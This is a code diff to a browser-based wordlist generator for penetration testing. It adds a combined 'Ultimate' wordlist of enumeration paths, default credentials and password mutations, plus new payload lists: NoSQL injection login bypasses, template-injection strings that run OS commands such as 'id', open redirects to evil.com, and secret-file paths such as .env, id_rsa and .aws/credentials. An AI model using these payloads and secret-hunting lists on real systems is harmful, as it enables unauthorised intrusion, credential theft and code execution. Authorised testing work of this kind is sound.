@@ -29,9 +29,37 @@ function initializeApp() {
     
     // Initialize drag and drop
     initializeDragDrop();
-    
+
     // Load quick action handlers
     initializeQuickActions();
+
+    // Add Select All / Select None controls to each generator panel
+    initializePanelSelectControls();
+}
+
+// Inject per-panel "Select All / Select None" controls next to each generator title
+function initializePanelSelectControls() {
+    document.querySelectorAll('.generator-panel').forEach(panel => {
+        const h2 = panel.querySelector('h2');
+        if (!h2 || panel.querySelector('.panel-select-controls')) return;
+
+        const controls = document.createElement('div');
+        controls.className = 'panel-select-controls';
+        controls.innerHTML = `
+            <button type="button" class="select-link" data-action="all">Select All</button>
+            <span class="select-sep">/</span>
+            <button type="button" class="select-link" data-action="none">Select None</button>
+        `;
+
+        h2.insertAdjacentElement('afterend', controls);
+
+        controls.querySelectorAll('.select-link').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const checked = btn.dataset.action === 'all';
+                panel.querySelectorAll('input[type="checkbox"]').forEach(cb => { cb.checked = checked; });
+            });
+        });
+    });
 }
 
 // Setup Event Listeners
@@ -51,6 +79,35 @@ function setupEventListeners() {
     
     // Keyboard shortcuts
     document.addEventListener('keydown', handleKeyboardShortcuts);
+
+    // Results toolbar: sort and filter
+    const sortSelect = document.getElementById('resultsSort');
+    if (sortSelect) {
+        sortSelect.addEventListener('change', () => applySortOrder(sortSelect.value));
+    }
+
+    const filterBtn = document.getElementById('applyFilterBtn');
+    if (filterBtn) {
+        filterBtn.addEventListener('click', applyResultsFilter);
+    }
+
+    const filterInput = document.getElementById('resultsFilter');
+    if (filterInput) {
+        filterInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') applyResultsFilter();
+        });
+    }
+
+    // Keyboard accessibility for the help FAB
+    const fab = document.querySelector('.fab');
+    if (fab) {
+        fab.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                showHelp();
+            }
+        });
+    }
 }
 
 // Tab Switching
@@ -160,6 +217,106 @@ function executeQuickAction(generator) {
     }, 500);
 }
 
+// The Ultimate Wordlist: combines every generator and data source in the
+// app - enumeration, credentials, usernames, brute-force patterns, hybrid
+// mutations, API/web-tech paths, and every security payload category -
+// into one massive, deduplicated wordlist.
+function generateUltimateWordlist() {
+    const btn = document.getElementById('ultimateBtn');
+    if (btn) {
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating Ultimate Wordlist...';
+    }
+    showProgress();
+
+    setTimeout(() => {
+        let wordlist = [];
+
+        // --- Recon / Enumeration ---
+        wordlist.push(
+            ...getCommonDirectories(),
+            ...getAdminPaths(),
+            ...getBackupFiles(),
+            ...getConfigFiles(),
+            ...getSecretsWordlist(),
+            ...getCloudBucketNames(),
+            ...getParameterNames(),
+            ...generateWebDirectories(),
+            ...generateSubdomains()
+        );
+
+        // --- Passwords ---
+        wordlist.push(
+            ...generateCommonPasswords(),
+            ...getKeyboardPatterns(),
+            ...generateDatePatterns(),
+            ...getNumericPatterns(4, 8)
+        );
+
+        // --- Default credentials (all vendors) ---
+        const creds = [
+            ...getRouterCredentials(),
+            ...getDatabaseCredentials(),
+            ...getWebCredentials(),
+            ...getOSCredentials()
+        ];
+        creds.forEach(cred => {
+            wordlist.push(`${cred.username}:${cred.password}`);
+            if (cred.username) wordlist.push(cred.username);
+            if (cred.password) wordlist.push(cred.password);
+        });
+
+        // --- Usernames ---
+        wordlist.push(...generateCommonUsernames());
+
+        // --- Hybrid mutations against a curated high-value base list ---
+        const ultimateBase = ['admin', 'password', 'welcome', 'root', 'test', 'user', 'login', 'secret', 'master', 'letmein'];
+        const currentYear = new Date().getFullYear();
+        ultimateBase.forEach(baseWord => {
+            wordlist.push(baseWord, toLeetSpeak(baseWord), capitalizeFirst(baseWord), baseWord.toUpperCase());
+            for (let i = 0; i <= 99; i++) {
+                wordlist.push(`${baseWord}${i}`);
+            }
+            for (let year = 2015; year <= currentYear; year++) {
+                wordlist.push(`${baseWord}${year}`);
+            }
+            ['!', '@', '#', '$', '123'].forEach(suffix => wordlist.push(`${baseWord}${suffix}`));
+        });
+
+        // --- API endpoints & web technology paths ---
+        wordlist.push(
+            ...getRESTEndpoints(), ...getGraphQLEndpoints(), ...getSOAPEndpoints(), ...getWebhookEndpoints(),
+            ...getWordPressPaths(), ...getDrupalPaths(), ...getJoomlaPaths(), ...getMagentoPaths(),
+            ...getApachePaths(), ...getNginxPaths(), ...getTomcatPaths(), ...getIISPaths(),
+            ...getLaravelPaths(), ...getDjangoFlaskPaths(), ...getSpringPaths(),
+            ...getExpressPaths(), ...getRailsPaths(), ...getAspNetPaths()
+        );
+
+        // --- Every security payload category, every variant ---
+        const allOn = { basic: true, advanced: true, bypass: true, encoded: true };
+        wordlist.push(
+            ...getSQLInjectionPayloads(allOn),
+            ...getXSSPayloads(allOn),
+            ...getLFIPayloads(allOn),
+            ...getRFIPayloads(allOn),
+            ...getCommandInjectionPayloads(allOn),
+            ...getXXEPayloads(allOn),
+            ...getSSRFPayloads(allOn),
+            ...getNoSQLInjectionPayloads(allOn),
+            ...getSSTIPayloads(allOn),
+            ...getOpenRedirectPayloads(allOn)
+        );
+
+        displayResults(wordlist, '🔥 ULTIMATE Combined Wordlist');
+
+        if (btn) {
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-bolt"></i> Generate Ultimate Wordlist';
+        }
+        hideProgress();
+    }, 50);
+}
+
 // Generator Functions
 function generateEnumeration() {
     const config = {
@@ -167,28 +324,43 @@ function generateEnumeration() {
         admin: document.getElementById('enum-admin').checked,
         backup: document.getElementById('enum-backup').checked,
         config: document.getElementById('enum-config').checked,
+        secrets: document.getElementById('enum-secrets').checked,
+        cloud: document.getElementById('enum-cloud').checked,
+        params: document.getElementById('enum-params').checked,
         extensions: document.getElementById('enum-extensions').value.split(',').map(ext => ext.trim()).filter(ext => ext),
         custom: document.getElementById('enum-custom').value.split('\n').filter(path => path.trim())
     };
-    
+
     let wordlist = [];
-    
+
     if (config.common) {
         wordlist.push(...getCommonDirectories());
     }
-    
+
     if (config.admin) {
         wordlist.push(...getAdminPaths());
     }
-    
+
     if (config.backup) {
         wordlist.push(...getBackupFiles());
     }
-    
+
     if (config.config) {
         wordlist.push(...getConfigFiles());
     }
-    
+
+    if (config.secrets) {
+        wordlist.push(...getSecretsWordlist());
+    }
+
+    if (config.cloud) {
+        wordlist.push(...getCloudBucketNames());
+    }
+
+    if (config.params) {
+        wordlist.push(...getParameterNames());
+    }
+
     // Add extensions
     if (config.extensions.length > 0) {
         const baseWords = [...wordlist];
@@ -561,6 +733,9 @@ function generateSecurity() {
         cmdi: document.getElementById('sec-cmdi').checked,
         xxe: document.getElementById('sec-xxe').checked,
         ssrf: document.getElementById('sec-ssrf').checked,
+        nosqli: document.getElementById('sec-nosqli').checked,
+        ssti: document.getElementById('sec-ssti').checked,
+        openredirect: document.getElementById('sec-openredirect').checked,
         basic: document.getElementById('sec-basic').checked,
         advanced: document.getElementById('sec-advanced').checked,
         bypass: document.getElementById('sec-bypass').checked,
@@ -595,6 +770,18 @@ function generateSecurity() {
 
     if (config.ssrf) {
         wordlist.push(...getSSRFPayloads(config));
+    }
+
+    if (config.nosqli) {
+        wordlist.push(...getNoSQLInjectionPayloads(config));
+    }
+
+    if (config.ssti) {
+        wordlist.push(...getSSTIPayloads(config));
+    }
+
+    if (config.openredirect) {
+        wordlist.push(...getOpenRedirectPayloads(config));
     }
 
     displayResults(wordlist, 'Security Testing Payloads');
@@ -644,6 +831,20 @@ function calculateWordlistStats(words) {
 
 const MAX_WORDLIST_SIZE = 1000000;
 
+// Renders currentWordlist into the results panel without touching history/stats.
+// Used both by displayResults() and by the sort/filter toolbar.
+function renderCurrentWordlist() {
+    const stats = calculateWordlistStats(currentWordlist);
+
+    document.getElementById('resultsTextarea').value = currentWordlist.join('\n');
+    document.getElementById('wordCount').textContent = stats.count.toLocaleString();
+    document.getElementById('fileSize').textContent = formatBytes(stats.size);
+    document.getElementById('uniqueCount').textContent = stats.unique.toLocaleString();
+    document.getElementById('avgLength').textContent = stats.avgLength;
+
+    return stats;
+}
+
 function displayResults(wordlist, generatorName) {
     let deduped = [...new Set(wordlist)]; // Remove duplicates
     let truncated = false;
@@ -654,19 +855,18 @@ function displayResults(wordlist, generatorName) {
     }
 
     currentWordlist = deduped;
-    const stats = calculateWordlistStats(currentWordlist);
-    
-    // Update results
-    document.getElementById('resultsTextarea').value = currentWordlist.join('\n');
-    document.getElementById('wordCount').textContent = stats.count.toLocaleString();
-    document.getElementById('fileSize').textContent = formatBytes(stats.size);
-    document.getElementById('uniqueCount').textContent = stats.unique.toLocaleString();
-    document.getElementById('avgLength').textContent = stats.avgLength;
-    
+    const stats = renderCurrentWordlist();
+
+    // Reset any active sort/filter UI state for the new result set
+    const sortSelect = document.getElementById('resultsSort');
+    if (sortSelect) sortSelect.value = 'none';
+    const filterInput = document.getElementById('resultsFilter');
+    if (filterInput) filterInput.value = '';
+
     // Update global stats
     appStats.totalGenerated += stats.count;
     updateStats();
-    
+
     // Add to history
     addToHistory({
         type: generatorName,
@@ -674,12 +874,57 @@ function displayResults(wordlist, generatorName) {
         timestamp: new Date().toISOString(),
         wordlist: currentWordlist.slice(0, 100) // Store first 100 for preview
     });
-    
+
     if (truncated) {
         showToast(`Generated ${stats.count.toLocaleString()} words (truncated to ${MAX_WORDLIST_SIZE.toLocaleString()} max) for ${generatorName}`, 'info');
     } else {
         showToast(`Generated ${stats.count} words for ${generatorName}`, 'success');
     }
+}
+
+// Re-sorts the current wordlist in place (does not affect history/stats)
+function applySortOrder(order) {
+    if (currentWordlist.length === 0) return;
+
+    switch (order) {
+        case 'az':
+            currentWordlist.sort((a, b) => a.localeCompare(b));
+            break;
+        case 'za':
+            currentWordlist.sort((a, b) => b.localeCompare(a));
+            break;
+        case 'len-asc':
+            currentWordlist.sort((a, b) => a.length - b.length);
+            break;
+        case 'len-desc':
+            currentWordlist.sort((a, b) => b.length - a.length);
+            break;
+        default:
+            return; // 'none' - leave as-is (can't recover original order after this point)
+    }
+
+    renderCurrentWordlist();
+}
+
+// Keeps only lines containing the filter text (case-insensitive); permanently narrows currentWordlist
+function applyResultsFilter() {
+    const filterInput = document.getElementById('resultsFilter');
+    const term = filterInput ? filterInput.value.trim().toLowerCase() : '';
+
+    if (!term) {
+        showToast('Enter text to filter by first', 'error');
+        return;
+    }
+
+    if (currentWordlist.length === 0) {
+        showToast('No wordlist to filter', 'error');
+        return;
+    }
+
+    const before = currentWordlist.length;
+    currentWordlist = currentWordlist.filter(word => word.toLowerCase().includes(term));
+    renderCurrentWordlist();
+    showToast(`Kept ${currentWordlist.length.toLocaleString()} of ${before.toLocaleString()} words matching "${term}"`, 'success');
 }
 
 function formatBytes(bytes) {
@@ -2108,6 +2353,209 @@ function getAspNetPaths() {
         '/swagger/', '/swagger/index.html', '/.well-known/',
         '/Trace.axd', '/elmah.axd', '/glimpse.axd'
     ];
+}
+
+// Secrets, tokens and config leaks commonly found during recon
+function getSecretsWordlist() {
+    return [
+        '.env', '.env.local', '.env.production', '.env.development', '.env.staging',
+        '.env.backup', '.env.old', '.env.save', '.env.bak', '.env.example',
+        '.git/config', '.git/HEAD', '.git-credentials', '.gitconfig',
+        '.npmrc', '.pypirc', '.netrc', '.htpasswd', '.htaccess',
+        'id_rsa', 'id_rsa.pub', 'id_dsa', 'id_ecdsa', 'id_ed25519',
+        'known_hosts', 'authorized_keys', '.ssh/id_rsa', '.ssh/config',
+        'secrets.json', 'secrets.yml', 'secrets.yaml', 'credentials.json',
+        'credentials.yml', 'service-account.json', 'serviceAccountKey.json',
+        'firebase.json', 'google-services.json', 'client_secret.json',
+        'config.json.bak', 'settings.json.bak', 'appsettings.secrets.json',
+        'docker-compose.yml', 'docker-compose.override.yml', 'Dockerfile',
+        '.dockerenv', '.dockercfg', '.docker/config.json',
+        'private.key', 'private.pem', 'server.key', 'server.pem',
+        'certificate.pem', 'keystore.jks', 'cacerts',
+        'jwt_secret', 'jwt.secret', 'secret_key', 'secret.key', 'master.key',
+        'api_key', 'api_keys.txt', 'apikey.txt', 'access_token', 'refresh_token',
+        'swagger.json', 'swagger.yaml', 'openapi.json', 'openapi.yaml',
+        '.well-known/security.txt', 'security.txt', 'robots.txt', 'sitemap.xml',
+        'CHANGELOG.md', 'composer.lock', 'package-lock.json', 'yarn.lock',
+        'webpack.config.js', 'tsconfig.json', '.babelrc', '.eslintrc',
+        'phpinfo.php', 'test.php', 'debug.log', 'error.log', 'access.log',
+        '.aws/credentials', '.aws/config', '.kube/config', '.terraform/',
+        'terraform.tfstate', 'terraform.tfvars', 'ansible.cfg', 'vault.yml'
+    ];
+}
+
+// Common cloud object storage bucket naming patterns (S3 / GCS / Azure Blob)
+function getCloudBucketNames() {
+    const prefixes = [
+        'assets', 'backup', 'backups', 'data', 'files', 'logs', 'media',
+        'static', 'cdn', 'uploads', 'images', 'downloads', 'public',
+        'private', 'dev', 'development', 'staging', 'prod', 'production',
+        'test', 'testing', 'qa', 'internal', 'external', 'archive',
+        'www', 'web', 'app', 'apps', 'mobile', 'api', 'db', 'database',
+        'content', 'docs', 'documents', 'reports', 'exports', 'imports',
+        'secrets', 'config', 'configs', 'terraform-state', 'tf-state',
+        'cache', 'temp', 'tmp', 'storage', 'bucket', 'blob', 's3',
+        'website', 'site', 'landing', 'marketing', 'analytics', 'logs-prod',
+        'logs-dev', 'user-data', 'userdata', 'customer-data', 'billing'
+    ];
+    const bucketNames = [...prefixes];
+    const suffixes = ['01', '001', '1', '2', 'v1', 'v2', 'new', 'old'];
+    prefixes.forEach(p => {
+        suffixes.forEach(s => {
+            bucketNames.push(`${p}-${s}`);
+            bucketNames.push(`${p}${s}`);
+        });
+        bucketNames.push(`${p}-bucket`);
+        bucketNames.push(`${p}-storage`);
+    });
+    return bucketNames;
+}
+
+// Common HTTP parameter/query-string names for fuzzing
+function getParameterNames() {
+    return [
+        'id', 'uid', 'user', 'username', 'user_id', 'userid', 'account',
+        'email', 'password', 'passwd', 'pwd', 'token', 'access_token',
+        'auth', 'authtoken', 'session', 'sessionid', 'sid', 'key', 'apikey',
+        'api_key', 'secret', 'client_id', 'client_secret', 'code', 'state',
+        'redirect', 'redirect_uri', 'redirect_url', 'return', 'returnurl',
+        'return_url', 'next', 'continue', 'url', 'uri', 'link', 'target',
+        'dest', 'destination', 'callback', 'jsonp', 'ref', 'referrer',
+        'referer', 'origin', 'host', 'domain', 'site', 'path', 'file',
+        'filename', 'filepath', 'folder', 'dir', 'page', 'p', 'view',
+        'template', 'include', 'load', 'src', 'source', 'action', 'cmd',
+        'command', 'exec', 'run', 'query', 'q', 'search', 's', 'keyword',
+        'sort', 'order', 'orderby', 'sortby', 'filter', 'limit', 'offset',
+        'page_size', 'per_page', 'count', 'format', 'type', 'mode', 'lang',
+        'language', 'locale', 'debug', 'test', 'admin', 'role', 'perm',
+        'permission', 'access', 'level', 'status', 'active', 'enabled',
+        'disabled', 'callback_url', 'webhook', 'webhook_url', 'image',
+        'img', 'avatar', 'document', 'doc', 'upload', 'download', 'export',
+        'import', 'data', 'payload', 'input', 'output', 'value', 'name',
+        'title', 'description', 'content', 'body', 'message', 'text',
+        'html', 'xml', 'json', 'csv', 'version', 'v', 'api_version',
+        'timestamp', 'time', 'date', 'from', 'to', 'start', 'end',
+        'csrf', 'csrf_token', '_csrf', 'xsrf', 'nonce', 'signature', 'sig',
+        'hash', 'checksum', 'otp', 'pin', 'captcha', 'g-recaptcha-response'
+    ];
+}
+
+function getNoSQLInjectionPayloads(config) {
+    const payloads = [];
+
+    if (config.basic) {
+        payloads.push(
+            '{"$gt":""}', '{"$ne":""}', '{"$ne":null}', '{"$gt":-1}',
+            '{"$regex":".*"}', '{"$exists":true}', '{"$where":"1==1"}',
+            "' || '1'=='1", "' || 1==1//", "'; return true; var x='",
+            'admin\' || \'1\'==\'1', '{"username":"admin","password":{"$ne":null}}',
+            '{"$or":[{"a":"a"}]}', "[$ne]=1", "[$gt]=", "[$regex]=.*"
+        );
+    }
+
+    if (config.advanced) {
+        payloads.push(
+            '{"$where": "sleep(5000)"}', '{"$where":"this.password.match(/.*/)"}',
+            '{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}',
+            '1; return this.password.length > 0;',
+            '"; return this.a == this.b && \'\' == \'',
+            '{"$where": "function(){return true}"}',
+            'db.collection.find({"$where": "1==1"})',
+            '{"$expr": {"$gt": [1, 0]}}'
+        );
+    }
+
+    if (config.bypass) {
+        payloads.push(
+            '{"$Gt":""}', '{"$NE":null}', '[$ne]', '[$gt]', '[$regex]',
+            '%27%20%7C%7C%20%271%27%3D%3D%271', '\' %26%26 this.password.match(/.*/)%2F%2F'
+        );
+    }
+
+    if (config.encoded) {
+        payloads.push(
+            '%7B%22%24gt%22%3A%22%22%7D', '%7B%22%24ne%22%3Anull%7D',
+            '%27%20%7C%7C%20%271%27%3D%3D%271'
+        );
+    }
+
+    return payloads;
+}
+
+function getSSTIPayloads(config) {
+    const payloads = [];
+
+    if (config.basic) {
+        payloads.push(
+            '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
+            '{{7*\'7\'}}', '${{7*7}}', '@(7*7)', '{{config}}', '{{settings}}'
+        );
+    }
+
+    if (config.advanced) {
+        payloads.push(
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
+            "<%= system('id') %>", "#{ `id` }",
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "{% for x in ().__class__.__base__.__subclasses__() %}{{ x }}{% endfor %}"
+        );
+    }
+
+    if (config.bypass) {
+        payloads.push(
+            '{{7*7}}', '{ {7*7} }', '{{\n7*7\n}}', '{{{7*7}}}',
+            '{%print(7*7)%}', "{{''.join(['7','*','7'])}}"
+        );
+    }
+
+    if (config.encoded) {
+        payloads.push(
+            '%7B%7B7*7%7D%7D', '%24%7B7*7%7D', '%3C%25%3D%207*7%20%25%3E'
+        );
+    }
+
+    return payloads;
+}
+
+function getOpenRedirectPayloads(config) {
+    const payloads = [];
+
+    if (config.basic) {
+        payloads.push(
+            '//evil.com', '//evil.com/', '/\\evil.com', '\\\\evil.com',
+            'https://evil.com', 'http://evil.com', '//google.com%2f@evil.com',
+            'https:evil.com', '/%2f/evil.com', '/%2fevil.com',
+            'https://trusted.com@evil.com', 'https://trusted.com.evil.com'
+        );
+    }
+
+    if (config.advanced) {
+        payloads.push(
+            '//evil.com/%2e%2e', 'https://evil.com/%2f%2e%2e',
+            'javascript:alert(document.domain)', 'data:text/html,<script>alert(1)</script>',
+            '/\\/evil.com', '\\/evil.com', '////evil.com', '/////evil.com',
+            '//evil.com/..;/'
+        );
+    }
+
+    if (config.bypass) {
+        payloads.push(
+            '/\\evil.com', '/.evil.com', '//evil%E3%80%82com', '//evil․com',
+            'https://evil.com\\@trusted.com', '//trusted.com%2f%2e%2e%2f%2f%2f%2fevil.com'
+        );
+    }
+
+    if (config.encoded) {
+        payloads.push(
+            '%2F%2Fevil.com', '%2Fevil.com', 'https%3A%2F%2Fevil.com',
+            '%68%74%74%70%3A%2F%2Fevil.com'
+        );
+    }
+
+    return payloads;
 }
 
 // Export for potential module use
